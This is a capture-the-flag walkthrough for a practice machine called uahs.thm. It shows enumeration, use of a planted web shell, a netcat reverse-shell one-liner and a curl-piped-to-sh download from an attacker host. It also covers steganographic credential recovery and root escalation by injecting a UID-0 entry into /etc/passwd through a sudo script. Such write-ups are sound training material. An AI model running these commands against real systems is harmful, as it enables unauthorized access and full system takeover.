# Scenario

Join us in the mission to protect the digital world of superheroes! U.A., the most renowned Superhero Academy, is looking for a superhero to test the security of our new site.

Our site is a reflection of our school values, designed by our engineers with incredible Quirks. We have gone to great lengths to create a secure platform that reflects the exceptional education of the U.A.

Please allow the machine 3 - 5 minutes to fully boot.

# Enumeration

## \[+] 10.10.228.36 - uahs.thm

We will add the target IP address and a domain name to our `/etc/hosts` file. Using `sudo sh -c`, executes the entire command as a subshell as `root` where we will then use `echo` to create a new line with `\n` followed by our target IP and the domain name we give it.

```sh
sudo sh -c 'echo "\n10.10.228.36 uahs.thm" >> /etc/hosts'
```

Then `export` the IP address to the environment variable `RHOSTS` so I can use `$RHOSTS` instead of typing the IP address every time.

```sh
export RHOSTS=10.10.228.36
```

First, I run a quick scan with [rustscan](https://github.com/RustScan/RustScan) and a longer [nmap](https://nmap.org/) stealth scan with `-Pn` mode enabled which will treat all hosts as online which helps find other hosts that block ICMP packets:

```sh
rustscan -a $RHOSTS --ulimit 5000 -b 4500 -t 2000 --range 1-65535 -- -sC -sV
sudo nmap -v -Pn -sS -p- -A --min-rate=1000 -T4 $RHOSTS -oN nmap.txt
```

## \[+] Port 80 - HTTP

### \[-] uahs.thm

Nothing to really look at on this website at first glance, so let's try fuzzing for files and directories using [feroxbuster](https://github.com/epi052/feroxbuster) with this [wordlist](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/raft-large-files.txt):

```sh
feroxbuster -u http://uahs.thm -w /usr/share/SecLists/Discovery/Web-Content/raft-large-files.txt -x json,txt,js,xml -s 200,301,302,403 -o p-80-www-ferox.txt
```

In the above screenshot, we find a suspicious PHP page which shows as `0l`, `0w`. `0c` which means the blank is completely blank. So, what does it actually do?

### \[-] uahs.thm/assets/index.php

Let's do some enumeration and see if this is a web shell of some sort by appending `?cmd=whoami` to the end of the URL and send the request using [curl](https://linux.die.net/man/1/curl):

```sh
curl -vvv http://uahs.thm/assets/index.php?cmd=whoami
```

![38e851914307bd95c553080dbf86a456.png](/resources/9622483de90e452fa768b1d881422c61.png)

In the response, we get the base64 string "`d3d3LWRhdGEK`". We could use CyberChef here, but it's much easier to pipe (`|`) the output to the `base64` command with the `-d` flag to decode the string:

```sh
curl -vvv http://uahs.thm/assets/index.php?cmd=whoami | base64 -d
```

![ae2e70e78845a0f1cfb28123da2e3a37.png](/resources/7625890b326a49ccaab17460df633008.png)

And, we have found a webshell!

# Initial Foothold

### \[-] www-data\@myheroacademia

To get a reverse shell, we first create a bash script with the reverse shell command and save it as `shell.sh`:

```sh
#!/usr/bin/env bash

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <ATTACKER_IP> 4444 >/tmp/f
```

Next, we will host the file using a simple Python server:

```sh
python3 -m http.server 8888
```

Before we execute our reverse shell script we have to start up a Netcat listener:

```sh
nc -nvlp 4444
```

Now we are ready to catch a shell by sending a `curl` command to download our reverse shell script and pipe the script to bash to execute it:

```sh
curl <ATTACKER_IP>:8888/shell.sh | sh
```

Let's also URL encode the command using [CyberChef](https://gchq.github.io/CyberChef/#recipe=URL_Encode%28true%29\&input=Y3VybCA8QVRUQUNLRVJfSVA%2BOjg4ODgvc2hlbGwuc2ggfCBzaA "https://gchq.github.io/CyberChef/#recipe=URL_Encode(true)\&input=Y3VybCA8QVRUQUNLRVJfSVA%2BOjg4ODgvc2hlbGwuc2ggfCBzaA") to avoid any character escaping in the terminal (make sure to check the "Encode all special chars" option):

```plaintext
curl%20%3CATTACKER%5FIP%3E%3A8888%2Fshell%2Esh%20%7C%20sh
```

![928a9e90cde198deb6585b375fde98be.png](/resources/d2cfdef1f368497b947e7116befb9dbc.png)

We will take this URL encoded command and append it to the previous URL we used to run the `whoami` command. The full command should look similar to this:

```sh
curl -vvv http://uahs.thm/assets/index.php?cmd=curl%20%3CATTACKER%5FIP%3E%3A8888%2Fshell%2Esh%20%7C%20sh
```

After a few seconds we should get a connection back from the viction machine on our Netcat listener:

![8ce3523a1726d5ad73c46422e68dae1f.png](/resources/0b398162c83048a88175bccaac2fe695.png)

Let's stablize our new shell:

1. Use Python to spawn a stable shell:

   ```sh
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   ```

2. `CTRL+Z` to background the current shell

3. Fix echoing and foregrounds the shell:

   ```sh
   stty raw -echo;fg
   ```

4. Set terminal to use 256 colors:

   ```sh
   export TERM=xterm-256color
   ```

# Privilege Escalation

### \[-] deku\@myheroacademia

We can now access the `assets/` directory which would have gave us a 403 forbidden error. Inside, we will find another directory, `images/` which has two JPG images that we can transfer by using a simple HTTP server:

```sh
cd /var/www/html/assets/images
ls -lah
python -m http.server 9999
```

On the attacking machine we can either use the web browser or the [wget](https://linux.die.net/man/1/wget) command to download the images:

```sh
wget uahs.thm:9999/oneforall.jpg
wget uahs.thm:9999/yuei.jpg
```

Still on the attacking machine, we use the [file](https://linux.die.net/man/1/file) command to check the file type and we will find that the `oneforall.jpg` file type is actually data and not image like `yuei.jpg`:

```sh
file oneforall.jpg
```

![880dbc5a1654b8218aa7d98c49533fef.png](/resources/9798d3521b9a49b2b3ce741c1d41a3b0.png)

```sh
file yuei.jpg
```

![a86ef379c2fb1c27239835c2a4f338fc.png](/resources/2b518026e64844268ea1dc0849f2ea22.png)

To extract the data from the `oneforall.jpg` image, we can use the [steghide](https://github.com/RickdeJager/StegSeek) tool. But, if we try to do this now, we will be prompted for a passphrase:

![518d2e9465a31b9eed8dc9e49fcb3025.png](/resources/f887153279c14016a84088e465197db9.png)

We also get an error telling us the file format of the file is not supported.

Let's investigate the file further by running the [xxd](https://linux.die.net/man/1/xxd) tool to create a hexdump and pipe (`|`) it to the [head](https://linux.die.net/man/1/head) command to print only the first couple of lines:

```sh
xxd oneforall.jpg | head
```

![376ab0ac69e0ccc5dcf23179580d6622.png](/resources/21142165b9834d95933227b540aca6ef.png)

The [file signature (magic bytes)](https://en.wikipedia.org/wiki/List_of_file_signatures) do not match the file's extension and since the PNG filetype is not supported by `steghide`, we will have to change the magic bytes to JPEG.

To change the file signature to JPEG, we can use the [hexeditor](https://www.rogoyski.com/adam/programs/hexedit/) tool and on the first line, we will change `89 50 4E 47 0D 0A 1A 0A 00 00 00 01` to `FF D8 FF E0 00 10 4A 46 49 46 00 01`.

```sh
hexeditor oneforall.jpg
```

Before:\
![7392b95104545c8bf755e6fb58eefbe1.png](/resources/4f56e0b1540648e18e7d5186e2bbcd77.png)

After:\
![406a18ca538f6659e0ca5d84a236e9bf.png](/resources/efc5c03211a94cbcbad96babd1286397.png)

Now, when we try to run the `steghide` tool, we are no longer getting the filetype error, but an incorrect passphrase error, instead:

![d1a47c17b59d147eb6e4a50297358102.png](/resources/c9b0dca688564e2ba01576cc8579c513.png)

Let's switch back to the victim machine to look for the passphrase.

Moving up a few directories, we will find the `Hidden_Content/` directory which has a text file with a base64 string inside:

```sh
cd /var/www/Hidden_Content/
ls -lah
cat passphrase.txt
```

![0d9d323953894be50f6cea92caac3c96.png](/resources/07c77d2aa29643b684a6f5e8b3579381.png)

To decode the base64 string, we can use the pipe character (`|`) to pass the output into the `base64` command with the `-d` flag to decode it:

```sh
cat passphrase.txt | base64 -d
```

Back on the attacking machine, we can run the `steghide` command again and provide the passphrase to extract the file:

![e70c39815a77ac5b5a78384020304419.png](/resources/453fd463dd844172abec10fdcf94528d.png)

Inside the `creds.txt` file we will find a note and credentials:

![457fed0f7bf852233810f6f00bc5420d.png](/resources/4a2e653413a04aa8b1c21d58c4761305.png)

## Port 22 - SSH

We can use these credentials to connect via SSH using the following command and enter the password when prompted:

```sh
ssh deku@uahs.thm
```

![7167912e1e1ab7359c34d8d1a554a16a.png](/resources/14c4595b33e9473384a3547f9a7bab5c.png)

We can find the user flag in `/home/deku/user.txt`:

```
ls -lah
cat user.txt
```

![e164c3f27887dd10929eed00c3d7ab2a.png](/resources/088d6571b3ec4376a924dec912fe0d36.png)

### \[-] root\@myheroacademia

Let's check the [sudo](https://linux.die.net/man/8/sudo) privileges for the user `deku` by running the following command:

```sh
sudo -l
```

![531090baa4c23a4bcd19c38be67c24b5.png](/resources/ed7b65a2d8584a5ebf66517787761796.png)

We can print the contents of the file and see what the script is doing:

```sh
cat /opt/NewComponent/feedback.sh
```

This script will ask for the user for their feedback and save it to a text file in `/var/log/feedback.txt`.

The most important part of the script is the following code which is filtering special characters (`` ` ``, `)`, `$(`, `|`, `&`, `;`, `?`, `!`, `\`) and then uses the `eval` function to run the system command `echo` with the `$feedback` variable:

```sh
if [[ "$feedback" != *"\`"* && "$feedback" != *")"* && "$feedback" != *"\$("* && "$feedback" != *"|"* && "$feedback" != *"&"* && "$feedback" != *";"* && "$feedback" != *"?"* && "$feedback" != *"!"* && "$feedback" != *"\\"* ]]; then
    echo "It is This:"
    eval "echo $feedback"
```

The filter is not complete and misses the two characters `>` and `/` which means we can at least overwrite files using these two characters. Since the script is also running with `sudo` means we can combine these to write to files as the root user with a simple command injection when the script prompts for feedback.

To escalate our privileges, we will be using the above technique to add a new user with root privileges to the `/etc/passwd` file.

Back on the attacking machine, we will generate a hashed password using the [mkpasswd](https://linux.die.net/man/1/mkpasswd) command:

```sh
mkpasswd -m md5crypt -s
```

![b00693be9a3e4ffb4a6a4191f19fa7f4.png](/resources/72e27bd41d434449adfb5d34ab0648ec.png)

Next, run the script with `sudo`:

```sh
sudo /opt/NewComponent/feedback.sh
```

Then, enter the following command when prompted for feedback. This will add a new user, `notroot` with the hashed version of our password and set the UID to `0` which will give us root privileges:

```sh
'notroot:$1$m.fGBmAs$fQu0PlSnn5cT9EYZykAsM1:0:0:notroot:/root:/bin/bash' >> /etc/passwd
```

![5413629b7a29f5cece6744bb50c3e34e.png](/resources/7f62415daafb4303a949693e1e6fdc1b.png)

Now, we can switch over to our new account and enter the password when prompted:

```sh
su notroot
```

![fd360e0b300eb7bf839203346d679624.png](/resources/d2393538db18402fb8f39b3338bd370a.png)

We can find the root flag in `/root/root.txt`:

```sh
cd /root
ls -lah
cat root.txt
```

![331fd6b37ae4ee900c2b7ddf24502526.png](/resources/bc06d956022444aa8167da32f87e8e4d.png)
